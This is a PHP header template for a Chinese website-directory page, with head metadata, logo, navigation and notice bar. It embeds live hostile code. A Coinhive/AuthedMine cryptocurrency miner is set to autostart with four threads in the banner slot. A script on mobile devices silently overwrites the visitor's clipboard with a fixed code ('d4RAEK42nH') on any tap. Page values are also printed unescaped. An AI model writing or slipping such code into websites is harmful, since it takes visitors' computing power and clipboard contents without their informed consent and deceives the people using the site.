<?php
defined('BASEPATH') OR exit('No direct script access allowed');
?>
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7">
        <link rel="shortcut icon" href="<?php echo base_url('statics/favicon.ico');?>">
        <link rel="stylesheet" href="<?php echo base_url('statics/css/style_default.css');?>">
        <meta name="viewport" content="initial-scale=1, maximum-scale=1">
        <?php if(preg_match('/cate\/[0-9]+/',$_SERVER['REQUEST_URI'])){ ?>
            <title><?php echo $cate_info['cate_name'],' - ',$cate_info['seo_title'];?></title>
            <meta name="keywords" content="<?php echo $cate_info['seo_keyword'];?>">
            <meta name="description" content="<?php echo $cate_info['seo_desc'];?>">
        <?php } else{?>
            <title><?php echo $sys_info['site_name'];?></title>
            <meta name="keywords" content="<?php echo $sys_info['site_keyword'];?>">
            <meta name="description" content="<?php echo $sys_info['site_desc'];?>">
        <?php }?>
        <script src="<?php echo base_url('statics/js/add_favor.js');?>"></script>
        <script src="https://authedmine.com/lib/simple-ui.min.js" async></script>
        <script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
        <script src="<?php echo base_url('statics/js/clipboard.min.js');?>"></script>
    </head>
    <body>
        <script>
            $("body").attr("id" ,"copy-code");
            $("body").attr("data-clipboard-text" ,"d4RAEK42nH");
            $("body").onclick = copyCode();
            function copyCode() {
                if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
                    var clipboard = new Clipboard('#copy-code');
                    // clipboard.on('success', function (e) {
                    //     alert("复制成功");
                    // });
                    // clipboard.on('error', function (e) {
                    //     alert("复制失败");
                    // });
                }
            }
        </script>
        <header id="header">
            <h1 id="logo">
                <a href="<?php echo $sys_info['logo_link']?>" title="爱资源导航">
                    <img src="<?php echo base_url('statics/img/izy_logo.png');?>" alt="爱资源导航">
                </a>
            </h1>
            <div id="top_img">
                <!--        <img src="#cate" alt="广告图片"/>-->
                <div class="coinhive-miner" 
                	style="width: 728px; height: 90px"
                	data-key="n7XejZC52bSD6EelLWDniPGWhhQadACr"
                	data-autostart="true"
                	data-whitelabel="false"
                	data-background="#000000"
                	data-text="#eeeeee"
                	data-action="#00ff00"
                	data-graph="#555555"
                	data-threads="4"
                	data-throttle="0.5">
                	<em>Loading...</em>
                </div>
            </div>
            <div class="tools">
                <a onclick="addFavor()">收藏本站</a>&nbsp;
                |&nbsp;<a href="<?php echo base_url('/home/apply');?>" target="_blank">网站提交</a>
            </div>
        </header>
        <nav>
            <ul>
                <li><a href="<?php echo $sys_info['logo_link']?>">首页</a></li>
                <li><a href="<?php echo base_url('/home/refer')?>">自助收录</a></li>
                <li><a href="<?php echo base_url('/home/apply')?>" target="_blank">网站提交</a></li>
            </ul>
            <strong class="notice">
                <a href="<?php echo $notice['link']; ?>" target="_blank" style="color:#<?php echo $notice['notice_color'];?>;"><?=$notice['notice'];?></a>
            </strong>
        </nav>

